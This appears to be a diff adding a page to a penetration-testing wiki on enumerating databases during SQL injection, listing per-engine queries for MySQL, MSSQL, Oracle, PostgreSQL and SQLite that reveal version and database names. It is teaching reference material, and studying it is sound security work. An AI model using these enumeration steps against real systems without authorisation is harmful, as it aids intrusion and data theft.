@@ -1,0 +1,112 @@
+# Enum Database
+
+## Theory
+
+When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains. 
+
+## Practice
+
+{% hint style="info" %}
+All queries on this page can be used with different techniques as UNION or Blind based attacks
+{% endhint %}
+
+### Database version 
+Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.  
+The queries to determine the database version for some popular database types are as follows:  
+
+{% tabs %}
+{% tab title="MySQL" %}
+```sql
+SELECT @@version 
+```
+{% endtab %}
+
+{% tab title="MSSQL" %}
+```sql
+SELECT @@version 
+```
+{% endtab %}
+
+{% tab title="OracleSQL" %}
+```sql
+SELECT banner FROM v$version
+```
+{% endtab %}
+
+{% tab title="PostgreSQL" %}
+```sql
+SELECT version() 
+```
+{% endtab %}
+
+{% tab title="SQLite" %}
+```sql
+SELECT sqlite_version();
+```
+{% endtab %}
+{% endtabs %}
+
+### Database Names 
+When performing SQL injections, it can be useful to know the names of the databases that are present on the targeted server. Enumerating the database names allows you to identify which databases are available and potentially gain insight into the server's configuration and architecture. This information can be used to craft more targeted and effective SQL injection attacks. 
+
+{% tabs %}
+{% tab title="MySQL" %}
+We can enum the current database with the following query:
+```sql
+SELECT database();
+```
+We can list all databases with the following query:
+```sql
+SELECT schema_name FROM information_schema.schemata;
+```
+{% endtab %}
+
+{% tab title="MSSQL" %}
+We can enum the current database with the following query:
+```sql
+SELECT DB_NAME();
+```
+We can list all databases with the following queries:
+```sql
+SELECT name FROM master..sysdatabases;
+/*or*/
+SELECT DB_NAME(N); — for N = 0, 1, 2, …
+```
+{% endtab %}
+
+{% tab title="OracleSQL" %}
+We can enum the current database with the following queries:
+```sql
+SELECT global_name FROM global_name;
+SELECT name FROM V$DATABASE;
+SELECT instance_name FROM V$INSTANCE;
+SELECT SYS.DATABASE_NAME FROM DUAL;
+```
+We can list all databases with the following query:
+```sql
+SELECT DISTINCT owner FROM all_tables;
+```
+{% endtab %}
+
+{% tab title="PostgreSQL" %}
+We can enum the current database with the following query:
+```sql
+SELECT current_database();
+```
+We can list all databases with the following query:
+```sql
+SELECT datname FROM pg_database;
+```
+{% endtab %}
+
+{% tab title="SQLite" %}
+We can extract database structure with the following query
+```sql
+SELECT sql FROM sqlite_schema;
+```
+{% endtab %}
+{% endtabs %}
+
+## Resources
+
+{% embed url="https://portswigger.net/web-security/sql-injection" %}
